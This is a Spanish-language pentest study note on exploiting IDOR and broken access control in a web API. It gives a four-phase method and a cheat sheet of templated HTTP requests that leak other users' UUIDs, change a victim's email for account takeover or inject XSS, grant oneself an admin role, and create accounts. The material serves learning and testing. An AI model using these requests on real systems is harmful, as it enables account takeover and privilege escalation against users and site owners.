---
tags:
  - IDOR
  - webapp
  - attack
---
## Conceptos Clave (TL;DR)

* Los endpoints de API que carecen de controles de acceso en el backend pueden revelar información de otros usuarios mediante solicitudes GET modificando identificadores como el UID.
* Esta fuga de información revela datos críticos, como UUIDs incalculables, que permiten modificar perfiles ajenos enviando solicitudes PUT.
* Al enumerar usuarios y descubrir roles privilegiados, un atacante puede interceptar la actualización de su propio perfil para asignarse dicho rol evadiendo validaciones.
* Con un nivel de acceso elevado, es posible crear o eliminar usuarios mediante solicitudes POST y realizar asignaciones masivas para comprometer múltiples cuentas simultáneamente.

## Herramientas Clave

* **Proxy HTTP (ej. Burp Suite)**: Se utiliza para interceptar las solicitudes HTTP (GET, PUT, POST), inspeccionar las respuestas JSON del servidor y modificar parámetros y cookies de sesión en tiempo real.
* **Lenguajes de Scripting**: Mencionados para automatizar la enumeración masiva de usuarios y ejecutar ataques a escala, como cambiar los correos electrónicos de todos los usuarios registrados.

## Metodología Paso a Paso
---
* **Fase 1: Information Disclosure (Fuga de Información)**

La lógica consiste en enviar solicitudes GET a la API apuntando a identificadores de otros usuarios. El objetivo es comprobar si el servidor devuelve detalles ocultos (como UUIDs y nombres de roles) sin validar si nuestra sesión actual tiene autorización para verlos.

---
* **Fase 2: Modificación de Usuarios Objetivo**

Una vez obtenido el UUID de la víctima, enviamos una solicitud PUT a su endpoint de perfil. Esta acción se ejecuta para alterar campos estratégicos, como cambiar su correo para recibir un enlace de restablecimiento de contraseña (Account Takeover) o inyectar un payload XSS en campos de texto que se ejecuten en su interfaz.

---
* **Fase 3: Escalación de Privilegios**

La fase requiere enumerar usuarios hasta identificar a un administrador y extraer el nombre exacto de su rol. Luego, interceptamos una solicitud de actualización de nuestro propio perfil para inyectar este rol privilegiado, aprovechando la falta de control de acceso en la asignación de roles del backend.

---
* **Fase 4: Ejecución de Funciones Inseguras y Asignación Masiva**

Tras asegurar el rol privilegiado, actualizamos nuestra cookie de sesión. Con la nueva autorización, enviamos solicitudes POST para crear cuentas no autorizadas o scripts que iteren sobre todos los UUIDs filtrados para aplicar cambios masivos en todo el sistema.

---
## Cheat Sheet de Comandos  

```http
# Enviar solicitud GET para enumerar y extraer datos sensibles de otro usuario (requerido para obtener su UUID)

GET <API_ENDPOINT>/<TARGET_UID> HTTP/1.1

Host: <TARGET_DOMAIN>

User-Agent: <USER_AGENT_STRING>

Cookie: role=<CURRENT_ROLE>
```

```json
# Estructura de la respuesta JSON filtrada. El UUID debe ser copiado para los ataques posteriores

{
    "uid": "<TARGET_UID>",
    "uuid": "<LEAKED_UUID>",
    "role": "<TARGET_ROLE>",
    "full_name": "<TARGET_FULL_NAME>",
    "email": "<TARGET_EMAIL>",
    "about": "<TARGET_ABOUT_TEXT>"
}
```

```http
# Enviar solicitud PUT usando el UUID filtrado para modificar detalles de otro usuario (ej. Account Takeover modificando email)

PUT <API_ENDPOINT>/<TARGET_UID> HTTP/1.1

Host: <TARGET_DOMAIN>

Cookie: role=<CURRENT_ROLE>

Content-Type: application/json

{
    "uid": "<TARGET_UID>",
    "uuid": "<LEAKED_UUID>",
    "role": "<TARGET_ROLE>",
    "full_name": "<TARGET_FULL_NAME>",
    "email": "<ATTACKER_CONTROLLED_EMAIL>",
    "about": "<XSS_PAYLOAD_OR_TEXT>"
}
```

```http

# Interceptar solicitud PUT propia para escalar privilegios cambiando nuestro rol a un rol de administrador descubierto

PUT <API_ENDPOINT>/<OWN_UID> HTTP/1.1

Host: <TARGET_DOMAIN>

Cookie: role=<CURRENT_ROLE>

Content-Type: application/json

{
    "uid": "<OWN_UID>",
    "uuid": "<OWN_UUID>",
    "role": "<DISCOVERED_ADMIN_ROLE>",
    "full_name": "<OWN_FULL_NAME>",
    "email": "<OWN_EMAIL>",
    "about": "<OWN_ABOUT_TEXT>"
}
```

```http
# Enviar solicitud POST para crear un nuevo usuario validando los controles de acceso omitidos. Requiere actualizar la cookie primero

POST <API_ENDPOINT> HTTP/1.1

Host: <TARGET_DOMAIN>

Cookie: role=<DISCOVERED_ADMIN_ROLE>

Content-Type: application/json

{
    "uid": "<NEW_UID>",
    "uuid": "<NEW_UUID>",
    "role": "<DESIRED_ROLE>",
    "full_name": "<NEW_FULL_NAME>",
    "email": "<NEW_EMAIL>",
    "about": "<NEW_ABOUT_TEXT>"
}
```

## "Gotchas" y Troubleshooting

* El ataque de modificación de usuarios requiere obligatoriamente conocer el UUID de la víctima; si no se logra calcular o filtrar previamente mediante Information Disclosure, no se podrán realizar alteraciones.

* La única forma de autorización de las solicitudes HTTP reside en una cookie controlable por el cliente (ej. `role=employee`), la cual no es verificada por el sistema backend contra los objetos solicitados.

* Al modificar tu propio rol a administrador en la base de datos, el navegador no reflejará este cambio automáticamente en las cabeceras; es estrictamente necesario refrescar la página o establecer la cookie manualmente (ej. `Cookie: role=web_admin`) para que el servidor confíe en tus futuras solicitudes.

* Si al enviar las solicitudes PUT o POST el servidor devuelve un estado `HTTP/1.1 200 OK` y no muestra errores de rol inválido, es la confirmación definitiva de que no existen medidas de seguridad en el backend y la operación fue procesada con éxito.
